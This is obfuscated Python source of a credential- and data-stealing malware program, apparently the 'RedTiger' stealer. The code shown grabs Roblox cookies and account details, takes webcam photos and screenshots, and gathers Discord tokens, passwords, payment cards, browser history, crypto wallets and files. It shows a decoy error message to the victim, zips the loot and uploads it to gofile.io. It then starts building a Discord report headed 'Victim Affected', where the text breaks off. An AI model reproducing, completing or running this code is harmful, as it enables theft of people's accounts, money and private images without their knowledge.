                DCWIOPTONPPQTTWHQJLRWHYOTJWUYJBLMNWHWZYCIVHCMWMYUUYJDTBKBNKZJOIJRWIVFTWJAPJQCUL = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get("RobuxBalance", "None")
                RRPZBLCKSSLFTNGJTWCSWJEUCISMEJFYJMCGSTAZXKWEKTUMULVIILBZQEV = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get("IsPremium", "None")
                JMDDKBAERWNXEBYOPOLZTKNLIDLKWGMVZGEFXIJAITNJOXAYPCGBIQUZQDLMHQYGAOSGKZPHFPSLDCPTJZFTIDUCIU = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get("ThumbnailUrl", "None")
                JOUVLCJBTIXJFWLEBARUPBIQYQBXBXFFRCMOCNKKWZMURKQOHVYGIMUGWPIZTQAOHUCJAFSGOMRNSWNTZT = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get("IsAnyBuildersClubMember", "None")
                
                JOJDEDLVMOHKVOFBCXXGNPMOSUAOLZIBAUDCDYQCERVUJCTXOJSKCAUCPZXEWSUWPKUZXRSHDDZDMFSXGSJL = JOJDEDLVMOHKVOFBCXXGNPMOSUAOLZIBAUDCDYQCERVUJCTXOJSKCAUCPZXEWSUWPKUZXRSHDDZDMFSXGSJL + f"""
Roblox Account n°{str(DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE)}:
 - Navigator     : {BTGQSECLSSVWGVJVUBVHKANWHMJOLYERGYUKUTJBMQLLGJJTVKIDFDCIXOIOTOXO}
 - Username      : {WSSBGLYEEGIPCVWABYRYKHJSZPEGLNCNGGURQICCTHOVRBZXWNHEHAYRJIJVRROJANMRVAOMY}
 - DisplayName   : {FJDQTZENYXAPFKSMQTJMAMLEJBILJTRWOVJBECBFXRBIMOEMKBDEOCDXBROPKZPPYWJPVGXWHNKLBQXOWGMFIMNDYUGR}
 - Id            : {FQNREPMGISCGFECQUWMIAUBPSMMQLBSOMACEYLGXDWLRJVSTKMKKRLMIDFKVHVYGEBVVWOMHCXJXKODKMBIBDGJBQJJXDOJZ}
 - Avatar        : {JMDDKBAERWNXEBYOPOLZTKNLIDLKWGMVZGEFXIJAITNJOXAYPCGBIQUZQDLMHQYGAOSGKZPHFPSLDCPTJZFTIDUCIU}
 - Robux         : {DCWIOPTONPPQTTWHQJLRWHYOTJWUYJBLMNWHWZYCIVHCMWMYUUYJDTBKBNKZJOIJRWIVFTWJAPJQCUL}
 - Premium       : {RRPZBLCKSSLFTNGJTWCSWJEUCISMEJFYJMCGSTAZXKWEKTUMULVIILBZQEV}
 - Builders Club : {JOUVLCJBTIXJFWLEBARUPBIQYQBXBXFFRCMOCNKKWZMURKQOHVYGIMUGWPIZTQAOHUCJAFSGOMRNSWNTZT}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not VTRXWRNTUVSZGZRVAVVSBPAPBNGNKJWCFMRBPWWBKZIPUAULFGBOPQCKEVSJBMXOCSYCJXZZJBROKAPGAFLRRA:
        JOJDEDLVMOHKVOFBCXXGNPMOSUAOLZIBAUDCDYQCERVUJCTXOJSKCAUCPZXEWSUWPKUZXRSHDDZDMFSXGSJL = "No roblox cookie found."
        
    BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Roblox Accounts ({DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE}).txt", JOJDEDLVMOHKVOFBCXXGNPMOSUAOLZIBAUDCDYQCERVUJCTXOJSKCAUCPZXEWSUWPKUZXRSHDDZDMFSXGSJL)

    return DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE

def UKMKUDULDRAXHHLBISLSLEJDPZWZMQARELWJVAIBCFNMCLPGYZDYYOGVMKLOTQYOWEAGDUDJHQ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import cv2
    import io
    from PIL import Image

    try:
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = "Yes"
        BTSYMTRDTPQSKVIAUQFIOMPPEQJHXETSNYOBLAHEHLOCPGKBYLBSLGPCDN = cv2.VideoCapture(0)

        if not BTSYMTRDTPQSKVIAUQFIOMPPEQJHXETSNYOBLAHEHLOCPGKBYLBSLGPCDN.isOpened():
            FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = "No webcam found."
            return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture

        v4r_ret, v4r_frame = BTSYMTRDTPQSKVIAUQFIOMPPEQJHXETSNYOBLAHEHLOCPGKBYLBSLGPCDN.read()
        BTSYMTRDTPQSKVIAUQFIOMPPEQJHXETSNYOBLAHEHLOCPGKBYLBSLGPCDN.release()

        if not v4r_ret:
            FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = "Failed to capture image."
            EPNFSQMWCGFFILNGXBSUHKDNQILQIJLAMLLUABDZPIIOVQPLBLRCMSZMKLZLRWGUGGGUOFOFUGRASLXG()
            return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture

        VPBIGVEAFGUDGSOFJIWHEIEGZKHSCQVIDMLUWNECGWQGZTEVBRMKNZJEVQMC = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        WAAJRZWIDQPLECRKFUSUCXTXCKZYARPETRAGTQECLJJGYVEVRLEKSNJ = Image.fromarray(VPBIGVEAFGUDGSOFJIWHEIEGZKHSCQVIDMLUWNECGWQGZTEVBRMKNZJEVQMC)
        DGSXITRBHOJTMFLWHWOILBDZZTQFJWTUNMAKODJJBHTZULBIQMDEBXNLCDZLQFMGEFOFMEKZRIRVGVQULPMZNHPVFKCSZMQBOU = io.BytesIO()
        WAAJRZWIDQPLECRKFUSUCXTXCKZYARPETRAGTQECLJJGYVEVRLEKSNJ.save(DGSXITRBHOJTMFLWHWOILBDZZTQFJWTUNMAKODJJBHTZULBIQMDEBXNLCDZLQFMGEFOFMEKZRIRVGVQULPMZNHPVFKCSZMQBOU, format='PNG')
        DGSXITRBHOJTMFLWHWOILBDZZTQFJWTUNMAKODJJBHTZULBIQMDEBXNLCDZLQFMGEFOFMEKZRIRVGVQULPMZNHPVFKCSZMQBOU.seek(0)
        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr("Webcam.png", DGSXITRBHOJTMFLWHWOILBDZZTQFJWTUNMAKODJJBHTZULBIQMDEBXNLCDZLQFMGEFOFMEKZRIRVGVQULPMZNHPVFKCSZMQBOU.read())

        return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture

    except Exception as e:
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = f"Error: {e}"
        return FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture

def BLIPVMSPQFDRAWCQWOJHKOJHVGJBXOLMDTXAHDMEWHGXLQLFHP(zip_file):
    import io
    from PIL import ImageGrab

    try:
        FUFEYVMASHIXZDVGDQTBAXTXRAIUEZKTYYVXAPUKZSLFMPOFGIZCQSQJVGDGDIMALZGQOTYFKVADNRAEGKVKK = "Yes"

        def C4ptur3():
            UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD_bytes = io.BytesIO()
            UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD.save(UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD_bytes, format='PNG')
            UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD_bytes.seek(0)
            return UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD_bytes

        UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", UQARBYKXPCZWQYXKVEYVPRBBSMTCTUXUYVGTYAKDGRYWPHDWKYCMKNGUBEYRANZBLDYCD_bytes.read())
        return FUFEYVMASHIXZDVGDQTBAXTXRAIUEZKTYYVXAPUKZSLFMPOFGIZCQSQJVGDGDIMALZGQOTYFKVADNRAEGKVKK
    except Exception as e:
        FUFEYVMASHIXZDVGDQTBAXTXRAIUEZKTYYVXAPUKZSLFMPOFGIZCQSQJVGDGDIMALZGQOTYFKVADNRAEGKVKK = f"Error: {e}"
        return FUFEYVMASHIXZDVGDQTBAXTXRAIUEZKTYYVXAPUKZSLFMPOFGIZCQSQJVGDGDIMALZGQOTYFKVADNRAEGKVKK

def OHPPFAGACNDCVLDCMSOKWNPXQJRREFTZAXMRRDKQQDMYQHVBWH():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("notice", "If you see this message, it means that Swift is not accessible in your region. Please make sure that you are using a VPN or Warp on your device. If it works fine, you can ignore this message.")

HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA = []

MOLHHKEHEKAFIYMMGLHTOQKBNDOBFXBABPXGJAGTENLZKZCSXVW = io.BytesIO()
with zipfile.ZipFile(MOLHHKEHEKAFIYMMGLHTOQKBNDOBFXBABPXGJAGTENLZKZCSXVW, "w", zipfile.ZIP_DEFLATED) as BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI:

    try: 
        ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD = GGZQVAYTKSYOXHKTXWLAYCYTUJQVVDZTNTCGUPNQYBXAFGQAWAFOFYJZQZVFATNJESJWOGACFHHDWWERIQGKCAGGCSPLH()
    except Exception as e:
        ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD = f"Error: {e}"

    try: 
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info = EJHGTQEIMBHTHAHNWHITNBKLVLRQMDZHUWXHPMFJZVXOYSJCZORZQGPDYPLUKKJHOFXVNMRXIBLDRMV(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info = f"Error: {e}"

    try: 
        MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV = EQUQRNFLAFTUTUUVIGGOHPQWEUGCADGLFJRKYKOYWUUUYYJHRAORKNOHVFDOXQBHURMAEJPXNQAQUZTYSASLQOGVL(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV = f"Error: {e}"

    try: 
        KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS, FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ, WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI, FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK, KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF, PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE = NDTBJPMJUIMTBSPSKEYLCNBGAFYRPPUHNYAXWPXHKOCCZHIWOZHSSWFGEIGVIWPEGZMAQYZDGRMKGXTGDIGJWXLSK(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS = f"Error: {e}"
        FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ = f"Error: {e}"
        WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI = f"Error: {e}"
        FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK = f"Error: {e}"
        KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF = f"Error: {e}"
        PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE = f"Error: {e}"

    try: 
        DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE = AEAZTDKSDUKQBDRCPVURNGHDKQXNITPRMONFUFZCQEEBFNMWLWSXWUZQTLCTAMBWDYIRRCMCWQ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE = f"Error: {e}"

    try: 
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = UKMKUDULDRAXHHLBISLSLEJDPZWZMQARELWJVAIBCFNMCLPGYZDYYOGVMKLOTQYOWEAGDUDJHQ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture = f"Error: {e}"

    try: 
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_screenshot = BLIPVMSPQFDRAWCQWOJHKOJHVGJBXOLMDTXAHDMEWHGXLQLFHP(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_screenshot = f"Error: {e}"

    try: 
        CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI, IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS, TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG = TQUJVOZDRADKLDSOLXKDXOEDCGDWHFQKVDRGBUMKPIHMTHUFKHUMRPLGPEWGZJDGBBALZ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_screenshot = f"Error: {e}"

    try: 
        NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN = YHKOOPOQFRQRLVTLJALHCWVWBGUUCBPPWOLLNOFMWNYHSYFCRIQKEZYAUZUQMWUWLHBIUS(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI)
    except Exception as e:
        NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN = f"Error: {e}"

    if ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Discord Injection : {ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD}")

    if FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Camera Capture    : {FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_camera_capture}")

    if FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_screenshot != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Screenshot        : {FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_screenshot}")

    if FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"System Info       : {FEJYWEGKTWAJIBQQPLOIZLSRVPNPXZGDBFFLKICAWFEFGRYNTDUFJPWOSQBSDUWMJOGREPUAUWPEHUPFKAXBLVKHPWZ_system_info}")

    if MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Discord Accounts  : {MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV}")

    if DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Roblox Accounts   : {DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE}")

    if FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Passwords         : {FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ}")

    if WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Cookies           : {WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI}")

    if PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Cards             : {PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE}")

    if FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Browsing History  : {FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK}")

    if KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Download History  : {KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF}")

    if KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Extentions        : {KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS}")

    if CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Wallets           : {CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI}")

    if IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Game Launchers    : {IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS}")
    
    if TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Apps              : {TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG}")
    
    if NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN != None:
        HIXGTUATPSBDBAUCUKNKTTFNZERQICGCJHKROLHDIWFSAMSRLIOUGBGZAXBNETJBUAYUCFWWDNTUKFAA.append(f"Interesting Files : {NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN}")

MOLHHKEHEKAFIYMMGLHTOQKBNDOBFXBABPXGJAGTENLZKZCSXVW.seek(0)

try:
    try: VDTXRMMNLPCJQQLLZFDBJYTYEEBYBYYHTPOGDRGKIJJRCZBUVTNVPF = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: VDTXRMMNLPCJQQLLZFDBJYTYEEBYBYYHTPOGDRGKIJJRCZBUVTNVPF = "store4"

    DWOOFIVLNXYZDDMBRJOJKPDLFEQXZAXKEABDZWQHAKALYGEZBLDBCBPSGEEBAGXYABTAKZMQDPVKIGHRQMORTLEEGDWUBC = requests.post(
        f"https://{VDTXRMMNLPCJQQLLZFDBJYTYEEBYBYYHTPOGDRGKIJJRCZBUVTNVPF}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI.replace(' ', '_')}.zip", MOLHHKEHEKAFIYMMGLHTOQKBNDOBFXBABPXGJAGTENLZKZCSXVW)}
    )

    PRJDJMLGPDOWLAPBAJSNSMIVIBDYJIASAOBHKYTQWNUBGYSAEZKH = DWOOFIVLNXYZDDMBRJOJKPDLFEQXZAXKEABDZWQHAKALYGEZBLDBCBPSGEEBAGXYABTAKZMQDPVKIGHRQMORTLEEGDWUBC.json()["data"]["downloadPage"]
except Exception as e:
    PRJDJMLGPDOWLAPBAJSNSMIVIBDYJIASAOBHKYTQWNUBGYSAEZKH = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=AYJBAAQFXHWGWWUODTJYHAUQYIZKKYHDEXFMBYYYJBRPRMKLMAONP
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {OBFZEWJWHIXJSRVUIVVHWOOBFRNETBPXHWOVKCAGLOHMPXNSQJNRYWQZZWXRXTDXTWIOGMQIMWAKOQIHUCPGWMNROXX}
